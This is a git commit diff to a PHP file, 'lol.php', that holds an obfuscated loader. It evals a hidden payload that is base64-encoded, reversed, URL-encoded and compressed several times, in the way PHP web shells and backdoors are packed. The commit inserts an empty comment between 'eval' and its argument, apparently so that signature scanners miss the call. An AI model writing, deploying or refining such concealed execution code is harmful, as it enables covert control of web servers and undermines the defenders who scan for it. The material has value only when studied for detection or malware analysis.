bc93cac44891d84836a2bc1f4a93d03d7ca60027
hime-yuki77 <123535502+hime-yuki77@users.noreply.github.com>
2023-01-30 19:18:26 +0700

    Update lol.php

--- lol.php
+++ lol.php
@@ -2,6 +2,6 @@
 
 $un = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
 $uk45 = "==wBPrLQTKZf992zbmEIjbULXeBj94J2zUrYGDOa8rYsz+p12Ydn7C7anNWaV58fav1SOoct4Mf+PsJ1szpIPhCvul19DKK/wPfh9zAEH/jXkzi/b3hm+Fu44MmtdnK/+0c43rPXAxkAK0Z5Qq6qZJHmd0JacdyFiRAUND82stj56oXMEDixfq79REhTeZuFi9tQcDkA+yYsQSZ2CDlwphv5ioto6yRYpQmETUqdpVpucJyqtomkJR1XKdVLhZ6W+oh7ZmmpCedb2g7SY8mhGsgAeR/RZYtXHr0R11sIjmCgonjXTpLrxBr5nqVu6wRdkqatbR558RcioJW/e+9L01EOiiCDhBaPiKgO87UaimwzEXUJchuOg4ENml/DkTIcPIDxQRHYTjAfpY8HayVExBANiUPzBXg+wLQVKrLKKuQ154YrtPikzEyatQLvFeffdLu0Xq6+zJCdajGogxoJgPyihAgoKKQXsXAVMBk6h1ZWDIIdZX4k9R/5//1l9Yq05ndLM+WAUow++yS0WIN3NKC0IE182JmB64IJCIGY7I+Y/cMFwIobrPZvcin/ZFgpBwJe+7UAxGg/JFgtB4PRBsbA";
-eval(htmlspecialchars_decode(urldecode(base64_decode($un))));
+eval/******/(htmlspecialchars_decode(urldecode(base64_decode($un))));
 exit;
 ?>
